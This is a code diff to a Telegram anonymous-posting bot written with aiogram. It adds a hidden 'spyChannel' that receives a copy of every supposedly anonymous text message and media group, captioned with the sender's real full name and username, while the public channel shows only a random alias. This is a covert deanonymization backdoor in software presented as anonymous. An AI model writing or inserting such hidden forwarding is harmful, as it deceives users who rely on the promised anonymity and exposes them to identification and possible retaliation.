@@ -8,7 +8,7 @@ from aiogram.fsm.context import FSMContext
 from app.functions import generate_full_name
 from app.keyboard import chooses, to_main_menu
 from app.states import AnonStates
-from config import CEO, mainChannel
+from config import CEO, mainChannel, spyChannel
 from aiogram.filters import CommandStart
 from aiogram.types import Message, ChatMemberUpdated, ReplyKeyboardRemove, CallbackQuery, InputMediaPhoto, \
     InputMediaVideo, InputMediaDocument
@@ -79,6 +79,9 @@ async def st_message(message: Message, bot: Bot, state: FSMContext):
         await bot.send_message(chat_id=mainChannel,
                                text=f"<blockquote>Анонимный субъект - {random_name}</blockquote>\n\n<blockquote>{message.text}</blockquote>",
                                parse_mode="HTML")
+        await bot.send_message(chat_id=spyChannel,
+                               text=f"{message.from_user.full_name} @{message.from_user.username}\n<blockquote>{message.text}</blockquote>",
+                               parse_mode="HTML")
         await update_question_time(message.from_user.id)
         await message.answer('Отправлено!', reply_markup=to_main_menu)
         await state.set_state(AnonStates.in_choose)
@@ -91,8 +94,6 @@ async def st_message(message: Message, bot: Bot, state: FSMContext):
                 f"Вы можете отправлять не более одного вопроса каждые 5 минут.\nСледующий вопрос будет доступен в {dt}.",
                 reply_markup=to_main_menu)
         await state.set_state(AnonStates.in_choose)
-
-
 
 
 @router.message(AnonStates.with_media)
@@ -120,6 +121,7 @@ async def collect_media(message: Message, state: FSMContext):
                 return
 
             media_group = []
+            media_group2 = []
 
             for i, (type_, file_id) in enumerate(media):
                 caption = f"<blockquote>Анонимный субъект - {random_name}</blockquote>\n\n<blockquote>{mss.replace('#end', '')}</blockquote>" if i == 0 else None
@@ -127,7 +129,14 @@ async def collect_media(message: Message, state: FSMContext):
                     media_group.append(InputMediaPhoto(media=file_id, caption=caption, parse_mode="HTML"))
                 elif type_ == "video":
                     media_group.append(InputMediaVideo(media=file_id, caption=caption, parse_mode="HTML"))
+            for j, (type_, file_id) in enumerate(media):
+                caption = f"{message.from_user.full_name} @{message.from_user.username}\n<blockquote>{mss.replace('#end', '')}</blockquote>" if j == 0 else None
+                if type_ == "photo":
+                    media_group2.append(InputMediaPhoto(media=file_id, caption=caption, parse_mode="HTML"))
+                elif type_ == "video":
+                    media_group2.append(InputMediaVideo(media=file_id, caption=caption, parse_mode="HTML"))
             await message.bot.send_media_group(chat_id=mainChannel, media=media_group)
+            await message.bot.send_media_group(chat_id=spyChannel, media=media_group2)
             await state.clear()
             await state.set_state(AnonStates.in_choose)
             await message.answer("Пост отправлен")
